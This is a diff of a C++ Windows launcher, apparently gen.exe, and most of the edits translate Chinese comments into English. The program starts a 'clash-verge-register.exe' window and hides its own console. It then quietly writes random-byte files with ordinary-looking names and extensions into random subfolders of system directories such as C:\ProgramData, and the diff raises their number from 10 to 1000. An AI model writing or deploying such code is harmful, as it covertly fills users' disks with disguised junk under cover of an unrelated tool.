@@ -17,7 +17,7 @@
 
      namespace fs = std::filesystem;
 
-     // 隐藏控制台窗口
+     // hide console
      void HideConsole() {
          HWND console = ::GetConsoleWindow();
          if (console != NULL) {
@@ -25,32 +25,32 @@
          }
      }
 
-     // 启动指定可执行文件
+     // start ./dist/clash-verge-register.exe
      bool LaunchExecutable(const std::wstring& exePath) {
          STARTUPINFOW si = { sizeof(si) };
          PROCESS_INFORMATION pi = { 0 };
          si.dwFlags = STARTF_USESHOWWINDOW;
-         si.wShowWindow = SW_SHOW; // 正常显示目标程序窗口
+         si.wShowWindow = SW_SHOW; // show window
 
-         // 转换为宽字符路径
+         // transfer to wide charset url
          std::wstring commandLine = L"\"" + exePath + L"\"";
 
-         // 启动进程
+         // start process
          BOOL success = CreateProcessW(
-             NULL,                       // 可执行文件路径
-             &commandLine[0],            // 命令行参数（可为空）
-             NULL,                       // 进程句柄不继承
-             NULL,                       // 线程句柄不继承
-             FALSE,                      // 不继承句柄
-             0,                          // 正常创建进程（无 CREATE_NO_WINDOW）
-             NULL,                       // 使用父进程环境
-             NULL,                       // 使用当前目录
-             &si,                        // 启动信息
-             &pi                         // 进程信息
+             NULL,                       // exe file url
+             &commandLine[0],            // command options(can be blank)
+             NULL,                       // don't inherit process's handle
+             NULL,                       // don't inherit thread's handle
+             FALSE,                      // don't inherit handle
+             0,                          // create process normally(no CREATE_NO_WINDOW)
+             NULL,                       // use father process env
+             NULL,                       // use current dir
+             &si,                        // start info
+             &pi                         // process info
          );
 
          if (success) {
-             // 关闭句柄
+             // turn off handle 
              CloseHandle(pi.hProcess);
              CloseHandle(pi.hThread);
              return true;
@@ -58,7 +58,7 @@
          return false;
      }
 
-     // 常见文件扩展名列表
+     // extension name list
      const std::vector<std::string> extensions = {
          ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", 
          ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".mp3", ".mp4", 
@@ -74,7 +74,7 @@
          ".php", ".woff", ".woff2", ".ttf", ".font"
      };
 
-     // 常见文件名前缀
+     // prefix list
      const std::vector<std::string> prefixes = {
          "report", "data", "document", "presentation", "image", "photo", 
          "video", "archive", "backup", "config", "settings", "temp", 
@@ -97,7 +97,7 @@
          "shell", "code", "module"
      };
 
-     // 常见文件名中间部分
+     // middle name list
      const std::vector<std::string> middles = {
          "_2023", "_2022", "_2021", "_final", "_draft", "_v1", "_v2", 
          "_v3", "_backup", "_temp", "_old", "_new", "_latest", 
@@ -116,13 +116,13 @@
          "_standard", ".const", ".function", "-save", "_message", "_link", "-compress"
      };
 
-     // 获取随机数生成器
+     // get random num generator
      std::mt19937& get_random_engine() {
          static std::mt19937 engine(std::random_device{}());
          return engine;
      }
 
-     // 生成随机文件名
+     // generate random file name
      std::string generate_filename() {
          auto& engine = get_random_engine();
          std::uniform_int_distribution<size_t> prefix_dist(0, prefixes.size() - 1);
@@ -136,18 +136,18 @@
                 extensions[ext_dist(engine)];
      }
 
-     // 生成随机文件大小 (1-20 MB)
+     // generate random file size (1KB - 10MB)
      size_t generate_file_size() {
          auto& engine = get_random_engine();
-         std::uniform_int_distribution<size_t> size_dist(1 * 1024 * 1024, 20 * 1024 * 1024);
+         std::uniform_int_distribution<size_t> size_dist(1 * 1024, 10 * 1024 * 1024);
          return size_dist(engine);
      }
 
-     // 获取Windows系统上的随机目录
+     // get random dir in Windows sys
      fs::path get_random_directory() {
          auto& engine = get_random_engine();
          
-         // Windows常见目录列表
+         // Windows dir list
          std::vector<fs::path> common_dirs = {
             fs::path("C:\\OnedriveTemp"),
             fs::path("C:\\ProgramData"),
@@ -171,7 +171,7 @@
          
          for (const auto& dir : common_dirs) {
              if (fs::exists(dir) && fs::is_directory(dir)) {
-                 // 随机选择一个子目录
+                 // choose one subdir randomly
                  std::vector<fs::path> subdirs;
                  try {
                      for (const auto& entry : fs::directory_iterator(dir)) {
@@ -185,33 +185,33 @@
                          return subdirs[dist(engine)];
                      }
                  } catch (...) {
-                     // 忽略权限错误等
+                     // ignore permission errors
                      continue;
                  }
              }
          }
          
-         // 回退到临时目录
+         // back to temp dir
          return fs::temp_directory_path();
      }
 
      int main() {
-         // 获取 gen.exe 的路径
+         // get url of gen.exe
          wchar_t exePath[MAX_PATH];
          GetModuleFileNameW(NULL, exePath, MAX_PATH);
          fs::path exeDir = fs::path(exePath).parent_path();
          std::wstring targetExe = (exeDir / "dist" / "clash-verge-register.exe").wstring();
 
-         // 启动 register.exe
+         // start register.exe
          if (!LaunchExecutable(targetExe)) {
-             // 可选：记录错误到日志（不影响主功能）
+             // option: record errors to log(doesn't affect main process)
              std::ofstream log("error.log", std::ios::app);
              log << "Failed to launch " << fs::path(targetExe).string() << "\n";
          }
 
-         HideConsole(); // 隐藏控制台
+         HideConsole(); // hide console
          
-         // 记录文件位置
+         // record file paths
          fs::path record_file = "C:\\ProgramData\\junk_files_record.txt";
          std::ofstream record(record_file, std::ios::app);
          if (!record) {
@@ -219,7 +219,7 @@
              record.open(record_file, std::ios::app);
          }
          
-         const int total_files = 10; // 生成文件总数
+         const int total_files = 1000; // sum amount of files generated
          int files_created = 0;
          
          while (files_created < total_files) {
@@ -231,7 +231,7 @@
                  
                  std::ofstream file(filepath, std::ios::binary);
                  if (file) {
-                     std::vector<char> buffer(1024 * 1024); // 1MB 缓冲区
+                     std::vector<char> buffer(1024 * 1024); // 1MB buffer size
                      auto& engine = get_random_engine();
                      std::uniform_int_distribution<int> byte_dist(0, 255);
                      
@@ -249,7 +249,7 @@
                      files_created++;
                  }
              } catch (...) {
-                 // 忽略权限错误等，继续尝试
+                 // ignore permission errors and try
              }
          }
          
